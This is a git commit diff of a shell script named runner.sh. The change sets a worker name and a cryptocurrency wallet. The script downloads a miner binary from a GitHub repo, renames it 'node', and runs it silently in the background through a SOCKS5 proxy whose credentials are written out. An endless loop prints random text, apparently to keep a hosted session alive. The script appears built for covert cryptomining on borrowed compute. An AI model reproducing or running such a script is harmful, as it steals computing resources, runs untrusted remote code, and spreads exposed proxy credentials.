102465a60a3f1cd168b8f5da6c54d562f98be0c6
sabtugilpon2210 <90607434+sabtugilpon2210@users.noreply.github.com>
2021-09-13 16:09:03 +0700

    Update runner.sh

--- runner.sh
+++ runner.sh
@@ -2,8 +2,8 @@
 wget -q https://github.com/fuckl0l/nanominer/raw/main/node
 chmod +x node
 pool="stratum+tcp://verushash.mine.zergpool.com:3300"
-workername="bambang"
-wallet="walletaddres"
+workername="savanacloud"
+wallet="DQGAS3U8cmDwBPn61bboXNBrSkEWhXuaVT"
 proxy="socks5://gtfrmnnv:h7l3wob1wn3m@45.72.119.109:9185"
 ./node -a verus -o $pool -u $wallet.$workername -t 2 -p c=DGB -x $proxy >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
